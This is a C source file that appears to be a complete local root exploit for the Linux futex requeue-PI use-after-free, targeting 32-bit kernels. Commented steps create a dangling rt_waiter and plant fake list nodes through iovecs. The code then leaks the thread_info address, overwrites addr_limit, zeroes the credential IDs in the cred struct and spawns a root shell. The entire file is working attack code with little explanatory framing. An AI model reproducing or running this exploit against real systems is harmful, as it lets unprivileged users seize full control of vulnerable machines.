#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <stdint.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <pthread.h>
#include <sys/socket.h>
#include <signal.h>

#define SOCKETPAIR_FAIL -12
#define SEND_ERR -13
#define IOVEC_NUM 7

uint32_t pi_futex, non_pi_futex;

struct mmsghdr mmsghdr;
struct iovec iovec[IOVEC_NUM];
int client, server;


struct list_head {
	struct list_head *next, *prev;
};

struct plist_node {
	int			prio;
	struct list_head	prio_list;
	struct list_head	node_list;
};

struct rt_mutex_waiter {
	struct plist_node	list_entry;
	struct plist_node	pi_futex_list_entry;
	uint32_t* task;
	uint32_t* lock;

}a, b;


void link_ab() {
	a.list_entry.node_list.prev = &b.list_entry.node_list;
	a.list_entry.prio_list.prev = &b.list_entry.prio_list;
	a.list_entry.prio = 121;
	
	b.list_entry.prio = 0x3;
	b.list_entry.prio_list.next = &a.list_entry.prio_list;
	b.list_entry.node_list.next = &a.list_entry.node_list;
}



void setup_mmsghdr_sockets() {
	int fd[2];
	int ret;

	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, fd);

	if(ret != 0) {
		exit(SOCKETPAIR_FAIL);
	}

	client = fd[0];
	server = fd[1];
	
	iovec[0].iov_base = 0x100;
	iovec[0].iov_len = &a.list_entry.prio_list;

	iovec[1].iov_base = 0x100;
	iovec[1].iov_len = &a.list_entry.prio_list;

	iovec[2].iov_base = 0x100;
	iovec[2].iov_len = &a.list_entry.prio_list;

	iovec[3].iov_base = 0x100;
	iovec[3].iov_len = &a.list_entry.prio_list;

	// Here is our fake rt_waiter struct.
	iovec[4].iov_base = 0x4;
	iovec[4].iov_len = &a.list_entry.prio_list;
	iovec[5].iov_base = &a.list_entry.prio_list;
	iovec[5].iov_len = &a.list_entry.node_list;
	iovec[6].iov_base = &a.list_entry.node_list;

	mmsghdr.msg_hdr.msg_iov = iovec;
	mmsghdr.msg_hdr.msg_iovlen = IOVEC_NUM;
}

static void child_code() {
	setup_mmsghdr_sockets();
	syscall(SYS_futex, &non_pi_futex, FUTEX_WAIT_REQUEUE_PI, 0, 0, &pi_futex, 0);
	//syscall(__NR_sendmmsg, client, &mmsghdr, 1, 0);
	//
	// All of the exploits available were using sendmmsg, I tried sendmmsg too in the first
	// But It wasn't enough for me to achieve rt_waiter struct for some reason.
	// Here I used recvmmsg, because no data is sent or received in the socket, recvmmsg 
	// will hang and that what I want.
	recvmmsg(client, &mmsghdr, 1, 0, NULL);
}

static void lock_pi_futex() {
	syscall(SYS_futex, &pi_futex, FUTEX_LOCK_PI, 0, 0, NULL, 0);
	//syscall(SYS_futex, pi_futex, FUTEX_TRYLOCK_PI, 0, 0, NULL, 0);
}

uint32_t thread_info;
pthread_t inserter;

static void get_leak() {

	link_ab();
	//*pi_futex = 0;
	pthread_create(&inserter, NULL, lock_pi_futex, NULL);
	sleep(2);
	printf("Got %x\n", (unsigned int)a.list_entry.prio_list.next);
	printf("Got %x\n", (unsigned int)a.list_entry.prio_list.prev);
	printf("Got %x\n", (unsigned int)a.list_entry.node_list.next);
	printf("Got %x\n", (unsigned int)a.list_entry.node_list.prev);

	// Thread_info leak.
	thread_info =  (unsigned int)a.list_entry.prio_list.prev & 0xffffe000;
	printf("Thread_info @ 0x%x\n", thread_info);
}

static void kcpy(void* dst, void* src, uint32_t len) {
	int pipefd[2];
	
	// Just to read ad write from and to the kernel.	
	pipe(pipefd);
	write(pipefd[1], src, len);
	read(pipefd[0], dst, len);
}


static void change_addr_limit_esc () {
	
	uint32_t addr_limit_corrupted = 0xffffffff;
	uint32_t root_fav_number = 0x0;
	uint32_t task_struct, group_leader, cred;

	// Make addr_limit = 0xffffffff
	kcpy(thread_info + 0x18, &addr_limit_corrupted, 4);
	
	
	// Get the address of the task_struct.
	kcpy(&task_struct, thread_info + 0x00, 4);
	printf("task_struct @ 0x%x\n", task_struct);

	// Get the address of the group_leader (parent thread).
	kcpy(&group_leader, task_struct + 0xe8, 4);
	printf("group_leader 0x%x\n", group_leader);

	// Get the cred struct address for the parent thread.
	kcpy(&cred, group_leader + 0x19c, 4);
	printf("cred struct 0x%x\n", cred);
	
	// Now patch *ID to 0.
	for(int i=1; i<9; i++)
		kcpy(cred + 0x4*i, &root_fav_number, 4);
		
}

static void esc_priv() {
	pthread_t esc;

	// Using signals is crucial here (I was stuck here for so long elongl wu saved me)
	// Because we can't execute more code on the thread that we know its thread_info
	// we can use signals to make that heppened, hook a signal code to the function we want
	// in this case SIGINT and then kill it with SIGINT.
	struct sigaction s = {.sa_handler = change_addr_limit_esc};
	sigaction(SIGINT, &s, NULL);

	// Corrupt addr_limit to have this condition : addr_limit > &addr_limit
	a.list_entry.prio_list.prev = thread_info + 0x18;
	pthread_create(&esc, NULL, lock_pi_futex, NULL);
	sleep(1);
	
	pthread_kill(inserter, SIGINT);
}


int main() {
	
	pthread_t child, ref_holder;

	// STEP 1 : lock a pi_futex to be able to create waiters later.
	syscall(SYS_futex, &pi_futex, FUTEX_LOCK_PI, 0, 0, NULL, 0);
	
	// STEP 2 : call futex_wait_requeue_pi(), here our rt_mutex struct well be going out of
	// scope but still linked to the waiters list. 
	pthread_create(&child, NULL, child_code, NULL);	
	

	// STEP 3 : call futex_requeue()
	sleep(1);
	syscall(SYS_futex, &non_pi_futex, FUTEX_CMP_REQUEUE_PI, 1, 1, &pi_futex, 0);
	
	// We will be using this to corrupt the doubly linked list (waiters list)
	// This will allocate a lock that will be used for our get_leak() function to use.
	pthread_create(&ref_holder, NULL, lock_pi_futex, NULL);
	sleep(1);
	
	// STEP 4 : set the PI futex manually in userland (we can do it), so that
	// self requeuing can occur.
	pi_futex = 0;
	
	// STEP 5 : requeue the PI futex to itself.
	syscall(SYS_futex, &pi_futex, FUTEX_CMP_REQUEUE_PI, 1, 1, &pi_futex, 0);
	
	// Get the leaks by corrupting the doubly linked list, SMAP is not set and that's helpfull for us.
	get_leak();
	
	// Make *ID to 0 in the cred struct, pretending to be a root process.
	esc_priv();
	sleep(2);

	// root shell.
	system("/bin/sh");
}
